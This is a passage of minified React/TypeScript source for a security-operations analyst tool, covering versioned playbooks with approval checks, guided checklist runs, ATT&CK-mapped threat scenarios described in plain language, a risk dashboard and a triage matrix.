 const pbs:PB[]=s.pbs;const [sel,setSel]=useState<string>(targetPb|| (pbs[0]?pbs[0].id:''));useEffect(()=>{if(targetPb&&pbs.some((p:PB)=>p.id===targetPb))setSel(targetPb)},[targetPb]);const [sum,setSum]=useState('');const [msg,setMsg]=useState('');const [liveMsg,setLiveMsg]=useState('');const [nn,setNn]=useState('');const [nk,setNk]=useState('investigation');
 const pb:PB|undefined=pbs.find((p:PB)=>p.id===sel)||pbs[0];
 const by:string=(auth.a&&auth.a.user&&auth.a.user.email)||'you (this browser)';
 const recommended=pbRecommendations(s,pbs);
 const available=pbNewEntries(pbs,by);
 const startRecommended=(id:string)=>{const p=pbs.find(p=>p.id===id);if(!p)return;
  const stepList=pbSteps(p.body);
  const r:Run={id:'r'+Date.now()+'-'+Math.random().toString(36).slice(2,6),pb:p.id,pbName:p.name,v:p.v,at:Date.now(),done:0,steps:stepList.map((x:any)=>({n:x.n,t:x.t,appr:x.appr,st:'todo',note:'',by:'',at:0})),verdict:'',note:''};
  up({runs:[...(s.runs||[]),r].slice(-30)});go('runs');
 };
 const advisory=<section className="pb-advisor" aria-label="Playbook recommendations"><div className="pb-advisor-head"><div><div className="pb-overline">ANALYST WORKFLOW · EVIDENCE FIRST</div><h2>Suggested next playbook</h2><p>Rule-based suggestions from local case text and event summaries. No remote AI call, no automatic containment or probability claim.</p></div><span className="pb-safety-pill">Approval required for action</span></div>
  {!recommended.length?<div className="pb-recommend-empty">No matching case signal yet. Load logs in Hunt or add factual findings to your case to receive a suggested procedure.<div className="pb-drills"><span>Explore a starter procedure:</span>{['password-spray','suspicious-powershell','backend-5xx-stability'].filter(id=>pbs.some(p=>p.id===id)).map(id=><button className="b" key={id} onClick={()=>setSel(id)}>{id.replace(/-/g,' ')}</button>)}</div></div>:<div className="pb-recommend-grid">{recommended.map(r=><article className="pb-recommend-item" key={r.id}><div className="pb-recommend-top"><strong>{r.id.replace(/-/g,' ')}</strong><span>{r.n} signal{r.n===1?'':'s'}</span></div><p>{r.tag}</p><small>{r.examples[0]}</small><div className="pb-recommend-actions"><button className="b" onClick={()=>setSel(r.id)}>Review procedure</button><button className="b pk" onClick={()=>startRecommended(r.id)}>Start guided run</button></div></article>)}</div>}
  {!!available.length&&<button className="b pb-add" onClick={()=>{up({pbs:[...pbs,...available]});setMsg('Added '+available.length+' new reviewed starter playbooks. Existing versions remain unchanged.');setSel(available[0].id)}}>Add {available.length} updated playbook{available.length===1?'':'s'} to my library</button>}
 </section>;

 const setPb=(id:string,p:Partial<PB>)=>up({pbs:pbs.map((x:PB)=>x.id===id?{...x,...p}:x)});
 const create=()=>{const slug=nn.trim().toLowerCase().replace(/[^a-z0-9]+/g,'-').replace(/^-|-$/g,'');if(!slug){setMsg('Give it a name first.');return}if(pbs.some((p:PB)=>p.id===slug)){setMsg('That name is taken.');return}
  const body=pbBody({name:slug,purpose:'Describe the question this playbook answers.',trig:'TBD',data:'TBD',budget:'15 minutes',pre:['TBD'],triage:['TBD'],steps:['**First step** — describe it.','**Second step** — describe it.','**Third step** — describe it.'],contain:['TBD'],recover:['TBD'],escal:['TBD'],collect:['TBD']});
  const t=Date.now();up({pbs:[...pbs,{id:slug,name:slug,kind:nk,v:1,body,at:t,log:[{v:1,at:t,by,sum:'created',body}],draft:null,prop:null}]});setSel(slug);setNn('');setLiveMsg('');setMsg('Created '+slug+' v1.')};
 const newForm=<div className="card"><h2>new playbook</h2><div className="row"><input aria-label="new playbook name" style={{flex:1,minWidth:150}} value={nn} placeholder="e.g. impossible-travel" onChange={e=>setNn(e.target.value)}/><select aria-label="playbook kind" style={{width:140}} value={nk} onChange={e=>setNk(e.target.value)}><option value="investigation">investigation</option><option value="triage">triage</option></select><button className="b te" onClick={create}>create</button></div></div>;
 if(!pb)return <div><h1>Playbooks</h1><p className="s" role="status" aria-live="polite">{msg||'No playbooks yet.'}</p>{newForm}</div>;
 const draft:string=pb.draft!=null?pb.draft:pb.body;const dirty=draft!==pb.body;
 const edit=(v:string)=>setPb(pb.id,{draft:v,prop:null});
 const propose=()=>{setPb(pb.id,{prop:{at:Date.now(),by,body:draft,ck:lintPb(draft,pb),sum:sum.trim()}});setLiveMsg('');setMsg('Checks ran on your proposal.')};
 const blockMsg=approvalBlock(pb.prop,by,!!(auth.a&&auth.a.token),!!s.twoPerson);
 const publish=()=>{const p=pb.prop;if(!p||p.ck.some((c:any)=>!c.ok)||blockMsg)return;const v=pbVersion(p.body);const ms=Date.now()-p.at;const t=Date.now();
  const entry:PBLog={v,at:t,by,sum:sum.trim()||p.sum||'no summary',body:p.body};
  setPb(pb.id,{v,body:p.body,at:t,log:[...pb.log,entry].slice(-8),draft:null,prop:null});setSum('');setMsg('');
  setLiveMsg(pb.name+' v'+v+' is live. Ready '+(ms<1000?ms+' ms':(ms/1000).toFixed(1)+' s')+' after you proposed it.')};
 const restore=(l:PBLog)=>{setPb(pb.id,{draft:bumpVersion(l.body,pb.v+1),prop:null});setLiveMsg('');setMsg('Restored v'+l.v+' as a draft with version '+(pb.v+1)+'. Review it, then propose it.')};
 const dl=()=>{try{const u=URL.createObjectURL(new Blob([pb.body],{type:'text/markdown'}));const a=document.createElement('a');a.href=u;a.download=pb.name+'.md';document.body.appendChild(a);a.click();a.remove();setTimeout(()=>URL.revokeObjectURL(u),500)}catch(e){setMsg('Use Copy instead.')}};
 const failing=pb.prop?pb.prop.ck.filter((c:any)=>!c.ok).length:0;

 const exportAll=()=>{try{const files=[...playbookFiles(pbs),...GIT_KIT];downloadBlob(makeZip(files),'soc-playbooks.zip');setMsg('Exported '+pbs.length+' playbooks plus the review kit. Unzip into a git repo, then see tools/GIT_SETUP.md.')}catch(e){setMsg('Export failed. Use download .md on each playbook.')}};
 const importMd=(e:any)=>{const fl:File[]=Array.from(e.target.files||[]) as File[];if(!fl.length)return;Promise.all(fl.map((f:File)=>f.text().then((tx:string)=>({n:f.name.replace(/\.md$/i,'').toLowerCase().replace(/[^a-z0-9]+/g,'-').replace(/^-|-$/g,''),tx})))).then((all:any[])=>{let next=[...pbs];let drafts=0,created=0;const t=Date.now();
  all.forEach((x:any)=>{if(!x.n||!x.tx.trim())return;const ex=next.find((p:PB)=>p.id===x.n);if(ex){next=next.map((p:PB)=>p.id===x.n?{...p,draft:x.tx,prop:null}:p);drafts++}else{const v=pbVersion(x.tx)||1;next.push({id:x.n,name:x.n,kind:/triage/i.test(x.n)?'triage':'investigation',v,body:x.tx,at:t,log:[{v,at:t,by,sum:'imported from file',body:x.tx}],draft:null,prop:null});created++}});
  up({pbs:next});setLiveMsg('');setMsg('Imported: '+drafts+' loaded as drafts to review and propose, '+created+' new playbook'+(created===1?'':'s')+'. New ones are live at the version in the file, so review them.')}).catch(()=>setMsg('Could not read those files.'));e.target.value=''};
 const gitCard=<div className="card"><h2>git and team review</h2><p className="s">Playbooks are plain markdown. Export them to a git repo and let GitHub pull requests give you a second reviewer, branch protection, and a lint check on every change. Import reviewed files back as drafts.</p>
 <div className="row"><button className="b pk" onClick={exportAll}>export all (.zip)</button><label className="b" style={{cursor:'pointer'}}>import .md files<input aria-label="import playbook files" type="file" accept=".md,text/markdown" multiple onChange={importMd} style={{display:'none'}}/></label></div>
 <label style={{display:'flex',gap:8,alignItems:'center',marginTop:12}}><input type="checkbox" aria-label="require two-person approval" checked={!!s.twoPerson} onChange={e=>up({twoPerson:e.target.checked})} style={{width:'auto'}}/>require two-person approval</label>
 <p className="s">When on, you cannot approve your own proposal, and you must be signed in so the approver is a named account. This is enforced by this app only. Anyone with access to the data can edit it directly, so for a strong control use GitHub branch protection as above.</p></div>;
 const libSync=lc&&auth.a&&auth.a.token?<Cloud auth={auth} cloud={lc} title="playbook library sync" what="the playbook library and runs"/>:null;
 return <div><h1>Playbooks</h1><div className="pb-model-link"><span><strong>Model assistance</strong><small>Local rules are active. Gemma/LoRA research is available in workspace settings; no agent is serving.</small></span><button onClick={()=>go('models')}>Open model settings →</button></div>{advisory}<p className="s" role="status" aria-live="polite">{liveMsg||msg||'One copy of each playbook, versioned. Edit, check, approve, and the new version is live.'}</p>
 <div className="row">{pbs.map((p:PB)=><button key={p.id} className={'pill '+(p.id===pb.id?'on':'')} onClick={()=>{setSel(p.id);setMsg('');setLiveMsg('')}}>{p.name} · v{p.v}</button>)}</div>
 <div className="card"><div className="row" style={{justifyContent:'space-between'}}><h2>{pb.name}</h2><span className="pill g">v{pb.v} · live</span></div>
 <p className="s">{pb.kind} playbook · updated {ago(pb.at)} · the only copy. Runs pin the version they start on.</p>
 <div className="pb-procedure-grid" aria-label="Structured procedure overview">
    <div className="pb-procedure-summary"><h3>Investigation sequence</h3>{pbSteps(pb.body).slice(0,8).map((step:any)=><div className="pb-procedure-step" key={step.n}><span>{String(step.n).padStart(2,'0')}</span><p>{step.t}{step.appr&&<em>Human approval gate</em>}</p></div>)}</div>
    <div className="pb-procedure-summary"><h3>Evidence to preserve</h3>{(pb.body.split('## 9. Evidence to collect\n')[1]||'').split('\n## ')[0].split('\n').filter((line:string)=>line.startsWith('- ')).map((line:string,i:number)=><p className="pb-evidence-line" key={i}>{line.slice(2)}</p>)}<button className="b pb-procedure-run" onClick={()=>startRecommended(pb.id)}>Start this guided run</button></div>
 </div>
 <label>edit (markdown)</label><textarea aria-label="playbook editor" rows={18} value={draft} onChange={e=>edit(e.target.value)} style={{fontFamily:'ui-monospace,Menlo,monospace',fontSize:13,width:'100%'}}/>
 <div className="row" style={{marginTop:8}}><button className="b" disabled={pbVersion(draft)===pb.v+1} onClick={()=>edit(bumpVersion(draft,pb.v+1))}>bump version to {pb.v+1}</button>{dirty&&<button className="b" onClick={()=>{setPb(pb.id,{draft:null,prop:null});setMsg('Draft discarded.')}}>discard draft</button>}<button className="b" onClick={()=>copyText(pb.body,(m:string)=>setMsg(m==='Copied'?'Live version copied.':m))}>copy live .md</button><button className="b" onClick={dl}>download .md</button></div></div>
 {dirty&&<div className="card" id="pb-changes"><h2>changes vs live</h2><Diff a={pb.body} b={draft}/><label>what changed, in a line</label><input aria-label="change summary" value={sum} onChange={e=>setSum(e.target.value)} placeholder="e.g. rule out a routine outage earlier"/><div className="row" style={{marginTop:8}}><button className="b pk" onClick={propose}>propose change</button></div></div>}
 {pb.prop&&<div className="card" id="pb-checks"><h2>checks</h2><p className="s">Run on the proposed text. All must pass before you can approve.</p>{pb.prop.ck.map((c:any)=><div key={c.n} className={'w '+(c.ok?'g':'')}>{c.ok?'✓':'✗'} {c.n}<span className="s"> {c.detail}</span></div>)}<div className="row" style={{marginTop:8}}><button className="b pk" disabled={failing>0||!!blockMsg} onClick={publish}>approve and publish v{pbVersion(pb.prop.body)}</button><span className="s">{failing>0?failing+' check'+(failing===1?'':'s')+' failing. Edit and propose again.':blockMsg||'approving as '+by}</span></div></div>}
 <div className="card"><h2>version history</h2>{pb.log.slice().reverse().map((l:PBLog)=><div className="prow" key={l.v+'-'+l.at}><span className="pn">v{l.v}</span><span className="s" style={{flex:1}}>{l.sum} · {l.by} · {ago(l.at)}</span>{l.v!==pb.v&&<button className="b" onClick={()=>restore(l)}>restore as draft</button>}</div>)}<p className="s">The last 8 versions are kept.</p></div>
 {newForm}
 {gitCard}{libSync}
 <div className="card"><h2>danger zone</h2><Hold label="delete this playbook" onDone={()=>{const rest=pbs.filter((x:PB)=>x.id!==pb.id);up({pbs:rest});setSel(rest[0]?rest[0].id:'');setMsg('Deleted '+pb.name+'. Past runs keep their record.')}}/></div></div>}

// ---- Runs ----
function Runs({s,up,go,auth,targetRun}:any){
 const runs:Run[]=s.runs;const pbs:PB[]=s.pbs;
 const [sel,setSel]=useState<string>(targetRun||(runs.length?runs[runs.length-1].id:''));useEffect(()=>{if(targetRun&&runs.some((r:Run)=>r.id===targetRun))setSel(targetRun)},[targetRun]);const [pid,setPid]=useState<string>(pbs[0]?pbs[0].id:'');const [msg,setMsg]=useState('');const [,tick]=useState(0);
 const run:Run|undefined=runs.find((r:Run)=>r.id===sel);
 useEffect(()=>{if(!run||run.done)return;const t=setInterval(()=>tick((x:number)=>x+1),1000);return()=>clearInterval(t)},[sel,run&&run.done]);
 const by:string=(auth.a&&auth.a.user&&auth.a.user.email)||'you';
 const fmt=(ms:number)=>{const t=Math.max(0,Math.floor(ms/1000));return String(Math.floor(t/60)).padStart(2,'0')+':'+String(t%60).padStart(2,'0')};
 const start=()=>{const p=pbs.find((x:PB)=>x.id===pid);if(!p){setMsg('Pick a playbook first.');return}
  const r:Run={id:'r'+Date.now(),pb:p.id,pbName:p.name,v:p.v,at:Date.now(),done:0,steps:pbSteps(p.body).map((x:any)=>({n:x.n,t:x.t,appr:x.appr,st:'todo',note:'',by:'',at:0})),verdict:'',note:''};
  up({runs:[...runs,r].slice(-30)});setSel(r.id);setMsg('Run started on '+p.name+' v'+p.v+'.')};
 const patchRun=(p:Partial<Run>)=>up({runs:runs.map((r:Run)=>r.id===sel?{...r,...p}:r)});
 const setStep=(i:number,p:Partial<RStep>)=>{if(run)patchRun({steps:run.steps.map((x:RStep,j:number)=>j===i?{...x,...p}:x)})};
 const mark=(i:number,st:string)=>setStep(i,{st,by,at:Date.now()});
 const summary=(r:Run)=>'Run: '+r.pbName+' v'+r.v+'\nVerdict: '+(r.verdict||'none')+'\nSteps done: '+r.steps.filter((x:RStep)=>x.st==='done').length+'/'+r.steps.length+'\nStalled: '+r.steps.filter((x:RStep)=>x.st==='stalled'||x.st==='waiting').length+'\nTime: '+fmt((r.done||Date.now())-r.at)+'\n'+r.steps.map((x:RStep)=>x.n+'. '+x.t+': '+x.st+(x.note?' ('+x.note+')':'')).join('\n')+(r.note?'\nNote: '+r.note:'')+'\n';
 const live:PB|undefined=run?pbs.find((x:PB)=>x.id===run.pb):undefined;
 const doneN=run?run.steps.filter((x:RStep)=>x.st==='done').length:0;const stallN=run?run.steps.filter((x:RStep)=>x.st==='stalled'||x.st==='waiting').length:0;
 return <div><h1>Runs</h1><p className="s" role="status" aria-live="polite">{msg||'Walk a playbook step by step. Each run records the version it used.'}</p>
 <div className="pb-run-notice">A run is an analyst checklist, not an automated security action. Preserve source evidence and obtain authorization before containment.</div><div className="card"><h2>start a run</h2><div className="row"><select aria-label="playbook to run" style={{flex:1,minWidth:180}} value={pid} onChange={e=>setPid(e.target.value)}>{pbs.map((p:PB)=><option key={p.id} value={p.id}>{p.name} · v{p.v}</option>)}</select><button className="b pk" onClick={start}>start run</button><button className="b" onClick={()=>go('playbooks')}>open playbooks</button></div></div>
 {runs.length>0&&<div className="row">{runs.slice().reverse().map((r:Run)=><button key={r.id} className={'pill '+(r.id===sel?'on':'')} onClick={()=>setSel(r.id)}>{r.pbName} v{r.v} · {r.done?(r.verdict||'done'):'active'}</button>)}</div>}
 {!run&&<div className="card"><p className="lead">No run selected. Start one above.</p></div>}
 {run&&<div><div className="card"><div className="row" style={{justifyContent:'space-between'}}><h2>{run.pbName}</h2><span className="pill g">pinned to v{run.v}</span></div>
 <p className="s">{run.done?'finished':'running'} · <span aria-label="elapsed time">{fmt((run.done||Date.now())-run.at)}</span>{live&&live.v!==run.v?' · live is now v'+live.v:''}{!live?' · playbook deleted':''}</p>
 {run.steps.length===0&&<div className="w">! This playbook has no numbered steps.</div>}
 {run.steps.map((x:RStep,i:number)=><div className="card" key={i}><div className="row" style={{justifyContent:'space-between'}}><b>Step {x.n} · {x.t}</b><span className={'pill '+(x.st==='done'?'g':'')}>{x.st==='waiting'?'waiting for approval':x.st}</span></div>
 {x.appr&&<p className="s">Needs approval before it counts as done.</p>}
 <div className="row" style={{marginTop:8}}>{!run.done&&(x.st==='done'?<button className="b" onClick={()=>mark(i,'todo')}>reopen</button>:x.appr?(x.st==='waiting'?<><button className="b pk" onClick={()=>mark(i,'done')}>approve</button><button className="b" onClick={()=>mark(i,'stalled')}>reject</button></>:<><button className="b te" onClick={()=>mark(i,'waiting')}>request approval</button><button className="b" onClick={()=>mark(i,'stalled')}>stalled</button></>):<><button className="b te" onClick={()=>mark(i,'done')}>done</button><button className="b" onClick={()=>mark(i,'stalled')}>stalled</button></>)}{x.by&&<span className="s">{x.by}</span>}</div>
 <input aria-label={'note for step '+x.n} disabled={!!run.done} style={{marginTop:8,width:'100%'}} value={x.note} placeholder="what you found" onChange={e=>setStep(i,{note:e.target.value})}/></div>)}</div>
 <div className="card"><h2>report card</h2><div className="row"><span className="pill">{doneN}/{run.steps.length} steps done</span><span className="pill">{stallN} stalled</span><span className="pill">{run.pbName} v{run.v}</span></div>
 <p className="pb-run-readiness">Report readiness: {doneN}/{run.steps.length} steps complete · {run.steps.filter((x:RStep)=>x.note.trim()).length} documented step notes · {stallN} stalled or awaiting approval. Unsupported verdicts should remain undetermined.</p><label>verdict</label><select aria-label="verdict" disabled={!!run.done} value={run.verdict} onChange={e=>patchRun({verdict:e.target.value})}><option value="">choose...</option><option value="true positive">true positive</option><option value="benign">benign</option><option value="escalated">escalated</option><option value="undetermined">undetermined</option></select>
 <label>note</label><textarea rows={2} disabled={!!run.done} value={run.note} onChange={e=>patchRun({note:e.target.value})}/>
 <div className="row" style={{marginTop:8}}>{!run.done&&<button className="b pk" disabled={!run.verdict} onClick={()=>{patchRun({done:Date.now()});setMsg('Run finished. It now appears in the case report.')}}>finish run</button>}<button className="b" onClick={()=>copyText(summary(run),(m:string)=>setMsg(m==='Copied'?'Run summary copied.':m))}>copy summary</button>{!run.done&&!run.verdict&&<span className="s">pick a verdict to finish</span>}</div></div></div>}</div>}

// ---- Threat scenarios ----
const SCEN:any[]=[
 {n:'Phishing credential theft',e:'🎣',tech:'T1566',tac:'Initial Access',sig:'A user reports an email asking them to sign in, and a login from a new country follows.',f:[['User entered credentials on a look-alike page','Credential Access',4],['Login from an unfamiliar location right after','Initial Access',4],['Mailbox rule created to hide replies','Defense Evasion',3]]},
 {n:'Account manipulation',e:'🪪',tech:'T1098',tac:'Persistence',pb:'account-manipulation',sig:'Someone is added to an admin group, or a role changes, outside a ticket.',f:[['Account added to a privileged group','Persistence',5],['Change made without a ticket','Persistence',3],['Actor account used at an unusual hour','Credential Access',3]]},
 {n:'Suspicious PowerShell',e:'💻',tech:'T1059.001',tac:'Execution',pb:'suspicious-powershell',sig:'An encoded command line, or an Office app starting PowerShell.',f:[['Encoded command line','Execution',4],['Office app started PowerShell','Initial Access',4],['Outbound download from the script','Command and Control',4]]},
 {n:'Security agent offline',e:'🛑',tech:'T1562.001',tac:'Defense Evasion',pb:'agent-offline',sig:'An agent goes silent and no maintenance window explains it.',f:[['Agent silent beyond the keepalive window','Defense Evasion',3],['Service stop event before the gap','Defense Evasion',4],['No maintenance window on record','Defense Evasion',2]]},
 {n:'Password spraying',e:'🔑',tech:'T1110.003',tac:'Credential Access',sig:'Many accounts, a few attempts each, from one source.',f:[['Many accounts, few attempts each, one source','Credential Access',3],['A success after many failures','Initial Access',4],['MFA prompt fatigue reported','Credential Access',3]]},
 {n:'Lateral movement over RDP and SMB',e:'🧭',tech:'T1021',tac:'Lateral Movement',sig:'A workstation connects to other workstations, or to admin shares.',f:[['Workstation to workstation RDP','Lateral Movement',4],['Admin share access from a user host','Lateral Movement',4],['New service created remotely','Persistence',4]]},
 {n:'Data exfiltration to cloud storage',e:'📤',tech:'T1567',tac:'Exfiltration',sig:'A large upload to a personal storage site, just after a bulk file read.',f:[['Large upload to a personal storage site','Exfiltration',4],['Bulk file read just before','Collection',3],['Archive created on the host','Collection',3]]},
 {n:'Ransomware precursors',e:'🔒',tech:'T1490',tac:'Impact',sig:'Shadow copies deleted, backup services stopped, files renamed in bulk.',f:[['Shadow copies deleted','Impact',5],['Backup service stopped','Impact',4],['Mass file renames','Impact',5]]}];
function Threats({s,up,go}:any){const [msg,setMsg]=useState('');
 const add=(x:any)=>{const have=s.findings.map((f:Finding)=>f.t);const n=x.f.filter((f:any)=>!have.includes(f[0]));up({findings:[...s.findings,...n.map((f:any)=>({t:f[0],c:'open',s:f[2]||3,th:f[1],a:[...s.assets]}))]});setMsg(n.length?n.length+' findings from '+x.n+' added to your case.':'Those findings are already in your case.')};
 return <div><h1>Threat scenarios</h1><p className="s" role="status" aria-live="polite">{msg||'Common patterns with their ATT&CK mapping. Add one and its findings flow into your case. These are starting points, not detections.'}</p>
 <div className="grid">{SCEN.map((x:any)=><div className="card" key={x.n}><div style={{fontSize:34}}>{x.e}</div><h3>{x.n} <span className="chip">{x.tech}</span></h3><p className="s">{x.tac}<br/>You see: {x.sig}</p>{x.f.map((f:any)=><div className="w" key={f[0]}>{f[0]}</div>)}<div className="row"><button className="b te" onClick={()=>add(x)}>Add to my case</button>{x.pb&&s.pbs.some((p:PB)=>p.id===x.pb)&&<button className="b" onClick={()=>go('playbooks')}>Open playbook</button>}</div></div>)}</div>
 <button className="b pk" style={{marginTop:16}} onClick={()=>go('case')}>Go to the case</button></div>}

// ---- Dashboard ----
function Dash({s,up,go,auth,cloud}:any){
 const [asset,setAsset]=useState('');const [tac,setTac]=useState('');const [msg,setMsg]=useState('');
 const L:any[]=scored(s);const c:any[]=checks(s);const passed=c.filter((x:any)=>x.ok).length;const pct=Math.round(passed/c.length*100);
 const CIRC=2*Math.PI*20;const off=CIRC*(1-pct/100);
 const q=[0,0,0,0];s.notes.forEach((n:Note)=>{q[quad(n)]++});const mx=Math.max(1,...q);
 const act=L.length?Math.round(L.filter((x:any)=>x.c==='open').length/L.length*100):0;
 const cont=s.actions.filter((r:Act)=>r.b==='contain'&&r.t.trim()).length;
 const hot=L.filter((x:any)=>(!asset||x.a.includes(asset))&&(!tac||x.th===tac));
 const maxSc=Math.max(1,...L.map((x:any)=>x.sc));
 const pr:any[]=s.assets.map((a:string)=>{const xs=L.filter((x:any)=>x.a.includes(a));return{a,n:xs.length,sc:+xs.reduce((t:number,x:any)=>t+x.sc,0).toFixed(1)}});
 const maxP=Math.max(1,...pr.map((r:any)=>r.sc));
 const tr:any[]=TACTICS.map((t:string)=>{const xs=L.filter((x:any)=>x.th===t);return{t,n:xs.length,avg:xs.length?+(xs.reduce((u:number,x:any)=>u+x.s,0)/xs.length).toFixed(1):0}}).filter((r:any)=>r.n>0);
 const lastRun:Run|undefined=s.runs[s.runs.length-1];
 const say=(m:string)=>setMsg(m);
 const jump=(id:string)=>{go('case');setTimeout(()=>{const e=document.getElementById(id);if(e)e.scrollIntoView({behavior:'smooth',block:'start'})},80)};
 const blocked='Copy was blocked. Open Case and select the text.';
 const copy=()=>{const t=md(s);track('case.copied');try{navigator.clipboard.writeText(t).then(()=>say('Report copied. Paste it anywhere.'),()=>say(blocked))}catch(e){say(blocked)}};
 const resetF=()=>{setAsset('');setTac('');say('Filters cleared')};
 const cur={pct,frust:L.length,ctrl:act,must:cont,top:L[0]?L[0].t:''};
 useEffect(()=>{const H=s.hist||[];const last=H[H.length-1];if(!last||last.pct!==pct)up({hist:[...H,{at:Date.now(),pct,frust:L.length,ctrl:act,must:cont}].slice(-30)})},[pct]);
 if(!L.length)return <div className="dash"><h1>dashboard</h1><div className="card"><p className="lead">No findings yet. The dashboard fills in as you add them.</p><div className="row"><button className="b pk" onClick={()=>go('case')}>start a case</button><button className="b" onClick={()=>go('threats')}>pick a threat scenario</button></div></div><Account auth={auth}/><Cloud auth={auth} cloud={cloud}/></div>;
 return <div className="dash">
  <div className="row dhead"><div><h1>dashboard</h1><p className="s" role="status" aria-live="polite">{msg||'a live view of the case. tap any number or row to act on it.'}</p></div>
   <div className="ring" title="Case readiness"><svg width="64" height="64" viewBox="0 0 56 56" aria-hidden="true"><circle cx="28" cy="28" r="20" fill="none" stroke="currentColor" strokeOpacity=".15" strokeWidth="5"/><circle cx="28" cy="28" r="20" fill="none" stroke="var(--acc,currentColor)" strokeWidth="5" strokeLinecap="round" strokeDasharray={CIRC} strokeDashoffset={off} transform="rotate(-90 28 28)" style={{transition:'stroke-dashoffset .9s cubic-bezier(.23,1,.32,1)'}}/></svg><span>{pct}%</span></div></div>
  <div className="kpis">{[['findings',L.length,'tap to jump to the facts',()=>jump('sec-facts')],['still active',act+'%','findings not contained',()=>{resetF();say('Showing all findings. Highest risk first.')}],['checks passed',passed+'/'+c.length,'tap a check below to fix it',()=>say('Tap a check below to fix it')],['contain now',cont,'open the response actions',()=>jump('sec-actions')]].map((k:any,i:number)=><button key={i} className="kpi" onClick={k[3]} style={{animationDelay:(i*80)+'ms'}}><span className="s">{k[0]}</span><b>{k[1]}</b><span className="s">{k[2]}</span></button>)}</div>
  <div className="card"><h2>case readiness</h2><div className="row">{c.map((x:any)=><button key={x.n} className={'pill '+(x.ok?'g':'')} onClick={()=>jump(x.id)}>{x.ok?'✓':'!'} {x.n}</button>)}</div></div>
  <div className="card"><h2>assets under pressure</h2><p className="s">tap an asset to filter the findings.</p>{pr.length===0&&<p className="s">add assets in the case to see this.</p>}{pr.map((r:any,i:number)=><button key={r.a} className={'prow '+(asset===r.a?'on':'')} onClick={()=>{const n=asset===r.a?'':r.a;setAsset(n);say(n?'Showing findings for '+n:'Showing every asset')}}><span className="pn">{r.a}</span><span className="bar2"><span className="bar" style={{width:(r.sc/maxP*100)+'%',animationDelay:(i*70)+'ms'}}/></span><span className="s">{r.n} findings · {r.sc}</span></button>)}</div>
  <div className="card"><h2>highest risk</h2><div className="row">{tac?<span className="pill on" onClick={()=>setTac('')}>tactic: {tac} ×</span>:null}{asset?<span className="pill on" onClick={()=>setAsset('')}>asset: {asset} ×</span>:null}<button className="b" onClick={resetF}>clear filters</button></div>
   {hot.length===0?<p className="s">Nothing matches these filters.</p>:hot.slice(0,8).map((x:any,i:number)=><div className="hot" key={i+x.t} style={{animationDelay:(i*60)+'ms'}}><div className="row" style={{justifyContent:'space-between'}}><b>{x.t}</b><span className="s">{CL[x.c]}</span></div><div className="bar2"><div className="bar" style={{width:(x.sc/maxSc*100)+'%'}}/></div><div className="row"><span className="pill">severity {x.s}/5</span><span className="pill">risk {x.sc}</span><span className="pill">{x.th}</span>{x.a.map((a:string)=><span key={a} className="pill g">{a}</span>)}</div><div className="row"><button className="b" onClick={()=>jump('sec-findings')}>edit in case</button><button className="b" onClick={()=>go('triage')}>plot on matrix</button></div></div>)}</div>
  <div className="card"><h2>att&ck tactics</h2><p className="s">brighter means higher average severity.</p><div className="row">{tr.map((r:any)=><button key={r.t} className={'pill '+(tac===r.t?'on':'')} style={{opacity:.4+.6*(r.avg/5)}} onClick={()=>{const n=tac===r.t?'':r.t;setTac(n);say(n?'Showing tactic: '+n:'Showing every tactic')}}>{r.t} · {r.n} · avg {r.avg}</button>)}</div></div>
  <div className="card"><h2>triage balance</h2>{QL.map((l:string,i:number)=><button key={l} className="qrow" onClick={()=>go('triage')}><span className="pn">{l}</span><span className="bar2"><span className="bar" style={{width:(q[i]/mx*100)+'%',minWidth:q[i]?6:0,animationDelay:(i*80)+'ms'}}/></span><b>{q[i]}</b></button>)}</div>
  <div className="card"><h2>playbook runs</h2>{lastRun?<p className="s">latest: {lastRun.pbName} v{lastRun.v}, {lastRun.done?(lastRun.verdict||'finished'):'in progress'}, {lastRun.steps.filter((x:RStep)=>x.st==='done').length}/{lastRun.steps.length} steps.</p>:<p className="s">no runs yet.</p>}<div className="row"><button className="b" onClick={()=>go('runs')}>open runs</button><button className="b" onClick={()=>go('playbooks')}>open playbooks</button></div></div>
  <Account auth={auth}/><Cloud auth={auth} cloud={cloud}/><History s={s} up={up} cur={cur}/>
  <div className="card"><h2>act on it</h2><div className="row"><button className="b pk" onClick={copy}>copy incident report</button><button className="b" onClick={()=>go('case')}>open case</button><button className="b" onClick={()=>go('triage')}>open triage</button><button className="b" onClick={()=>go('runs')}>start a run</button><button className="b" onClick={()=>go('timeline')}>Open timeline ({(s.timeline||[]).length})</button></div></div></div>}
function Faq(){return <div><h1>FAQ</h1>{FAQ.map((f:string[])=><details key={f[0]}><summary>{f[0]}</summary><p className="s">{f[1]}</p></details>)}</div>}

function Matrix({s,up,go}:any){
 const [sel,setSel]=useState<number|null>(null);
 const [title,setTitle]=useState('Which finding do we contain first?');
 const [txt,setTxt]=useState('');const [col,setCol]=useState(SV[0]);const [shape,setShape]=useState('sq');
 const [snap,setSnap]=useState(false);const [grid,setGrid]=useState(true);
 const [cm,setCm]=useState('');const [fr,setFr]=useState<number|null>(null);
 const [dump,setDump]=useState('');const [iocs,setIocs]=useState<any[]>([]);const [step,setStep]=useState(0);const [msg,setMsg]=useState('');const [shared,setShared]=useState(false);
 const dragRef=useRef(false);const dbr=useRef<any>(null);const tm=useRef<any>(null);
 const notes:Note[]=s.notes;const nr=useRef<Note[]>(notes);nr.current=notes;
 const commit=(n:Note[])=>{const before=nr.current;const moved=n.find((k:Note)=>{const o=before.find((q:Note)=>q.id===k.id);return!!o&&(o.x!==k.x||o.y!==k.y)});
   if(moved)setMsg(moved.t+' is now in '+QL[quad(moved)]);up({notes:n});
   if(dbr.current){clearTimeout(tm.current);tm.current=setTimeout(()=>{dbr.current.set({notes:JSON.stringify(n)}).catch(()=>{})},350)}};
 useEffect(()=>{let dead=false;let off:any=null;(async()=>{try{const C:any=(window as any).claude;const db=await C.use('db');if(!db||dead)return;dbr.current=db.doc('boards/main');setShared(true);
   const un=dbr.current.onSnapshot((sn:any)=>{if(dead||dragRef.current||!sn.exists)return;try{const n=JSON.parse(sn.data().notes);if(JSON.stringify(n)!==JSON.stringify(nr.current))up({notes:n})}catch(e){}},()=>{});
   if(dead)un();else off=un}catch(e){}})();return()=>{dead=true;if(off)off()}},[]);
 const add=(t:string,sh:string)=>{if(!t.trim())return;const n:Note={id:Date.now(),t:t.trim(),x:45,y:40,col,shape:sh,votes:0,cm:[]};commit([...notes,n]);setSel(n.id);setTxt('');setMsg('Added "'+n.t+'" to the center. Drag it into place.')};
